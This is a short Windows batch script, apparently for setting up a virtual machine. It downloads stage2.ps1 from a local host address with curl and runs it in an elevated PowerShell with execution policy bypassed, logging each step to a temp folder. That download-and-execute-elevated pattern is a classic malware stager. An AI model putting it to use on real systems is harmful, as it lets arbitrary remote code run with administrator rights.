@echo off
set d=%TEMP%\p37vm
mkdir %d% 2>nul
echo go %DATE% %TIME% > %d%\go.log
curl -s -o %d%\stage2.ps1 http://10.0.2.2:8080/stage2.ps1
echo curl rc=%ERRORLEVEL% >> %d%\go.log
dir %d% >> %d%\go.log 2>&1
powershell -NoProfile -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','%d%\stage2.ps1'"
echo launched elevated rc=%ERRORLEVEL% >> %d%\go.log
